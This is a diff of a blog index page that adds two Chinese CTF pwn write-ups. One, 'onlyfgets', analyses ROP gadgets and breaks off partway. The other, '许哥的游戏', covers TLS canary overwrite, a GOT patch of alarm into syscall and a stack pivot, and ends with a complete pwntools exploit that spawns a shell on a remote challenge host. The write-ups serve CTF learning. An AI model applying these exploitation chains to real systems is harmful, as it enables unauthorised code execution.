@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -183,7 +183,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -200,6 +200,340 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/08/2025-12-08-onlyfgets/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/08/2025-12-08-onlyfgets/" class="post-title-link" itemprop="url">CTF题解：onlyfgets</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-08 22:04:00" itemprop="dateCreated datePublished" datetime="2025-12-08T22:04:00+08:00">2025-12-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-14 19:52:23" itemprop="dateModified" datetime="2025-12-14T19:52:23+08:00">2025-12-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="onlyfgets"><a href="#onlyfgets" class="headerlink" title="onlyfgets"></a>onlyfgets</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/onlyfgets/checksec.png" alt="image-20251207102811670"></p>
+<p><img src="/images/onlyfgets/main.png" alt="image-20251207102832960"></p>
+<p><img src="/images/onlyfgets/222.png" alt="image-20251207102938104"></p>
+<p>程序只有NX保护，且有简单栈溢出。但是，查看程序没有system等可以直接获得shell的gadget</p>
+<p>有signal和alarm，根据提示gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010ae : add bl, dh ; endbr64 ; ret</span><br><span class="line">0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：</p>
+<p><code>endbr64</code>（End Branch 64-bit）是 <strong>Intel CET</strong>（Control-flow Enforcement Technology）技术的一部分，用于防止ROP攻击。</p>
+<p>作用：endbr64  ; 标记这是一个合法的间接跳转目标</p>
+<p>工作原理：</p>
+<ol>
+<li>运行时检查：当程序通过间接跳转（如 <code>call rax</code>, <code>jmp [rbx]</code>）执行时</li>
+<li>如果目标地址不是 <code>endbr64</code> 指令 → 触发异常</li>
+<li>如果是 <code>endbr64</code> 指令→ 正常执行</li>
+</ol>
+</blockquote>
+<p>分析一下两个原语</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add bl, dh ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 修改 RBX 的最低字节：BL = BL + DH</span><br><span class="line"><span class="number">2.</span> 不影响其他寄存器（除了 RBX）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减（除非溢出）</span><br><span class="line"><span class="number">2.</span> 只能修改最低字节</span><br><span class="line"><span class="number">3.</span> DH 的值是运行时决定的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line"><span class="comment">#能力：</span></span><br><span class="line"><span class="number">1.</span> 内存加法：*(rbp-<span class="number">0x3d</span>) += ebx</span><br><span class="line"><span class="number">2.</span> 操作<span class="number">32</span>位数据（dword）</span><br><span class="line"><span class="number">3.</span> 返回控制流</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制：</span></span><br><span class="line"><span class="number">1.</span> 只能加，不能减</span><br><span class="line"><span class="number">2.</span> 只能操作 [rbp-<span class="number">0x3d</span>] 这个固定偏移</span><br><span class="line"><span class="number">3.</span> 操作<span class="number">4</span>字节，可能影响指针的高位</span><br></pre></td></tr></table></figure>
+
+<p><strong>假设我们可以控制 rbp 和 ebx，就可以向任意地址 (rbp - 0x3d) 加任意值 (ebx)</strong></p>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）-原语利用"><a href="#（一）-原语利用" class="headerlink" title="（一） 原语利用"></a>（一） 原语利用</h3><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>根据上述分析，我们尝试控制 rbp 和 ebx，查一下 pop 指令：</p>
+<p><img src="/images/onlyfgets/step1.png" alt="image-20251208144151439"></p>
+<p>可以看到，我们有了gadget</p>
+<ul>
+<li>0x000000000040114d : pop rbp ; ret</li>
+<li>0x00000000004011fc : pop rdi ; ret</li>
+</ul>
+<p>但是无法直接控制 ebx。思考，ebx 可以通过 bl + dh 修改，通过调试命令查看一下dh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xae\x10\x40\x00\x00\x00\x00\x00&quot;</span> | gdb ./onlyfgets -ex <span class="string">&quot;b *0x4010ae&quot;</span> -ex <span class="string">&quot;r&quot;</span> -ex <span class="string">&quot;print (\$rdx &gt;&gt; 8) &amp; 0xFF&quot;</span> -ex <span class="string">&quot;c&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：</p>
+<ol>
+<li><p>输入</p>
+<ul>
+<li><p><code>-e</code>：启用转义字符解释</p>
+</li>
+<li><p><code>AAAAAAAA...</code>：40个 ‘A’（32缓存，8 rbp）</p>
+</li>
+<li><p><code>\xae\x10\x40\x00\x00\x00\x00\x00</code>：小端序的 0x4010ae（<code>add bl, dh</code> gadget）</p>
+</li>
+</ul>
+</li>
+<li><p>断点：</p>
+<ul>
+<li><p><code>-ex</code>：执行gdb命令</p>
+</li>
+<li><p><code>b *地址</code>：在指定地址设置断点</p>
+</li>
+<li><p><code>0x4010ae</code>：<code>add bl, dh</code> gadget 的地址</p>
+</li>
+</ul>
+</li>
+<li><p>计算</p>
+<ul>
+<li><p><code>-ex &quot;r&quot; </code> ：运行程序</p>
+</li>
+<li><p><code>\$rdx</code>：RDX 寄存器（需要转义 <code>$</code>）</p>
+</li>
+<li><p><code>&gt;&gt; 8</code>：右移8位（获取高8位）</p>
+</li>
+<li><p><code>&amp; 0xFF</code>：取低8位</p>
+</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>运行结果：</p>
+<p><img src="/images/onlyfgets/step11.png" alt="image-20251208150004782"></p>
+<p>可以看到计算出 $1 (即dh) &#x3D; 32 (0x20)。或者直接看下面RDX显示的0xfbad208b</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00000000fbad208b</span><br><span class="line">          ↑↑</span><br><span class="line">高位字节   低位字节</span><br><span class="line"></span><br><span class="line">RDX（64位）：0x00000000fbad208b</span><br><span class="line">EDX（32位）：0xfbad208b  </span><br><span class="line">DX（16位）：0x208b</span><br><span class="line">DH（高8位）：0x20</span><br><span class="line">DL（低8位）：0x8b</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>(注：</p>
+<p><strong>这是 <code>_IO_FILE</code> 结构的标志位。<code>0xfbad</code> 是 glibc 的魔法数字，标识这是一个 <code>_IO_FILE</code> 结构；而标志位 <code>0x208b</code>，</strong></p>
+<ul>
+<li><p>0x2000 &#x3D; _IO_USER_BUF    (0x2000) - 用户提供的缓冲区</p>
+</li>
+<li><p>0x0080 &#x3D; _IO_CURRENTLY_PUTTING (0x0080) - 当前正在写入</p>
+</li>
+<li><p>0x0008 &#x3D; _IO_NO_READS    (0x0008) - 不允许读取</p>
+</li>
+<li><p>0x0002 &#x3D; _IO_LINE_BUF    (0x0002) - 行缓冲</p>
+</li>
+<li><p>0x0001 &#x3D; _IO_UNBUFFERED  (0x0001) - 无缓冲)</p>
+</li>
+</ul>
+<p><strong>所以，DH 值是固定的：来自 stdin 的 flags 字段，每次都是 0x20，无法改变，除非能修改内存中的 stdin 结构本身</strong></p>
+</blockquote>
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>现在我们确认了，每次 add bl, dh 会给 bl 加 0x20，所以需要加上0x20的倍数，加法后的地址必须是<strong>另一个有用函数</strong>的地址</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/07/2025-12-07-%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/07/2025-12-07-%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/" class="post-title-link" itemprop="url">CTF题解：许哥的游戏</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-07 20:00:00" itemprop="dateCreated datePublished" datetime="2025-12-07T20:00:00+08:00">2025-12-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-14 19:49:43" itemprop="dateModified" datetime="2025-12-14T19:49:43+08:00">2025-12-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="许哥的游戏"><a href="#许哥的游戏" class="headerlink" title="许哥的游戏"></a>许哥的游戏</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/checksec.png" alt="image-20251203135321711"></p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/alarm.png" alt="xxxx"></p>
+<ol>
+<li><p>checksec发现需要绕过canary</p>
+</li>
+<li><p>alarm+5里有syscall</p>
+<blockquote>
+<p>注意：libc-2.27.so特有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#patch为指定动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./ld-2.27.so ./attachment</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp里指定libc</span></span><br><span class="line">sh = process(<span class="string">&#x27;./attachment&#x27;</span>,</span><br><span class="line">	env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.27.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+</blockquote>
+</li>
+<li><p>Weapon</p>
+<p>&#x3D;&#x3D;&gt;set_zero，任意地址写0</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/set.png" alt="image-20251205102032289"></p>
+</li>
+<li><p>Fight（close(1)和close(2)关闭标准输出和标准错误</p>
+<p>&#x3D;&#x3D;&gt;challenge3，存在溢出</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/challenge3.png" alt="image-20251205102137346"></p>
+</li>
+</ol>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）challenge3确认偏移"><a href="#（一）challenge3确认偏移" class="headerlink" title="（一）challenge3确认偏移"></a>（一）challenge3确认偏移</h3><p>在pwndbg中，cyclic 240（反编译中看到缓冲区248），进入challenge3后输入，Ctrl C中断</p>
+<p><img src="/images%5C%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F%5Cfinally.png"></p>
+<p>stack 50查看栈布局</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/canary.png" alt="image-20251205102850007"></p>
+<p>可以看到rbp前就是canary，所以偏移：<code>248+canary+rbp+return_addr</code></p>
+<h3 id="（二）size-zero写-tls-中-canary-为0"><a href="#（二）size-zero写-tls-中-canary-为0" class="headerlink" title="（二）size_zero写 tls 中 canary 为0"></a>（二）size_zero写 tls 中 canary 为0</h3><h4 id="i）利用原理"><a href="#i）利用原理" class="headerlink" title="i）利用原理"></a>i）利用原理</h4><ol>
+<li><strong>任意地址写 0</strong>：<ul>
+<li><code>str</code> 是一个全局变量（地址固定）</li>
+<li><code>lVar1</code> 是用户输入的有符号长整数</li>
+<li>最终写入地址：<code>str + lVar1</code></li>
+<li>写入内容：8 字节的 0（<code>undefined8</code> 表示 8 字节）</li>
+</ul>
+</li>
+<li><strong>目标：tls 中的 canary</strong>：<ul>
+<li>在 Linux x64 中，栈保护 canary 存储在 TLS（Thread Local Storage）中</li>
+<li>位置：<code>fs:[0x28]</code>（或 <code>gs:[0x28]</code>，取决于编译）</li>
+<li>每次函数开始时从 <code>fs:[0x28]</code> 加载到栈上</li>
+<li>函数结束前检查栈上的值是否与 <code>fs:[0x28]</code> 中的一致</li>
+</ul>
+</li>
+</ol>
+<h4 id="ii）寻找-tls-canary-地址"><a href="#ii）寻找-tls-canary-地址" class="headerlink" title="ii）寻找 tls canary 地址"></a>ii）寻找 tls canary 地址</h4><ol>
+<li><p>首先在pwndbg中 info registers</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/fs.png"></p>
+<p>看到 fs 基址为0x794eabc8c580</p>
+</li>
+<li><p>再 x&#x2F;gx 查看0x28偏移处，通过 stack 20 确认到这里确实是 canary 的地方</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/0x28.png" alt="dd"><img src="C:\Users\WH\AppData\Roaming\Typora\typora-user-images\image-20251207111715732.png" alt="image-20251207111715732"></p>
+</li>
+<li><p>因为要加上str指针，所以再查看一下str处的数据</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/str.png"></p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/data.png"></p>
+<p>所以我们需要的输入：<code>0x794eabc8c580 + 0x28 - 0x794eabc8a000 = 0x25a8</code></p>
+</li>
+</ol>
+<h3 id="（三）bless第二关改-alarm-为-syscall"><a href="#（三）bless第二关改-alarm-为-syscall" class="headerlink" title="（三）bless第二关改 alarm 为 syscall"></a>（三）bless第二关改 alarm 为 syscall</h3><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/attack.png" alt="image-20251207113247398"></p>
+<p>这里有任意地址加5，刚好匹配 alarm + 5 &#x3D; syscall，可以改got表。</p>
+<p>bless后验证一下：</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/bless.png" alt="image-20251207113128649"></p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>最后，在栈溢出部分，有 rbp 的 off-by-null，可以将rbp的最后一个字节覆盖为0，刚好是前面缓冲区22个ret的地址，而且由于执行到了challenge3和Fight的末尾，有两个<code>leave，ret</code>刚好可以<strong>栈迁移</strong>到缓冲区，执行ROP链</p>
+<blockquote>
+<p>注：ret相当于 pop rip ; rip &#x3D; [rsp] ; rsp &#x3D; rsp + 8，所以把alarm@got(即syscall&#x3D;0x602058) pop到rsp里，再通过ret访问got表对应的真实地址</p>
+</blockquote>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/stack.png"></p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./attachment&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.27.so&#x27;, &#x27;LD_LIBRARY_PATH&#x27;: &#x27;.&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34792</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weapon</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;..!?\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bless</span>(<span class="params">count, addr</span>):</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(addr).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">content1, content2</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.send(content1)</span><br><span class="line">    </span><br><span class="line">    sh.send(content2)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x04007fe</span></span><br><span class="line">pop_rdi = <span class="number">0x4013f4</span></span><br><span class="line">pop_rsi = <span class="number">0x4013f6</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f8</span></span><br><span class="line">pop_rsp = <span class="number">0x4013fa</span></span><br><span class="line">bin_sh = <span class="number">0x4019D7</span></span><br><span class="line">syscall = <span class="number">0x602058</span></span><br><span class="line"></span><br><span class="line">weapon(<span class="number">0x25a8</span>)</span><br><span class="line">bless(<span class="number">5</span>, syscall)</span><br><span class="line"></span><br><span class="line">payload1 = p64(ret)*<span class="number">22</span></span><br><span class="line">rop_chain = p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rsp) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload1 = payload1 + rop_chain</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">59</span></span><br><span class="line">challenge(payload1, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.send(&#x27;exec 1&gt;&amp; 0&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
